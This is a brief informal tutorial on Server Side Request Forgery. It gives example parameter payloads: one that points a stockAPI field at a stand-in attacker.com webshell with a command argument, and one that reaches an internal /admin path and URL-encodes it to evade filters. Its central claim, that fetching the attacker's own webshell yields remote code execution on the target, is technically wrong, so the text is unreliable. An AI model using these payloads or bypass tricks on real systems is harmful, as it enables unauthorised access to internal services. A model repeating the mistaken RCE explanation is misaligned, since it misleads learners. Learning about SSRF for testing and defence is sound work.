<h2>SSRF - Server Side Request Forgery.
One of the best vulnerabilities (in my opinion) as this can have unlimited impact. From accessing internal files, like admin panels, to sending a request to your own controlled server and requesting your own file</h2>

---
<h3>Basic examples are:</h3>

```stockAPI=http://fbi.com/clothing/shirts=shirts123```

As You can see, the stockAPI is making a request to to it's API/Server. We can change this so that the stockAPI makes a request to our controlled server/internal file/internal link (like /admin)

```StockAPI=http://attacker.com/webshell.php?command=id```

And with this simple case, we have achieved Webshell RCE.

---
<h3>Encoding Payloads</h3>
Now, SSRF is not a secret, so some websites may filter certain characters or increase security.

To bypass firewalls, we can encode our payloads or find alternatives
(like you could bypass XSS with prompt() rather than alert() )

For example:
```stockAPI=http://fbi.com/admin/``` 
Could get picked up and blocked!

But if you try encoding(URL) some characters, it should allow you to bypass the filtering!
Or even double URL encode.
```stockAPI=http://fbi.com/%41dmin/```
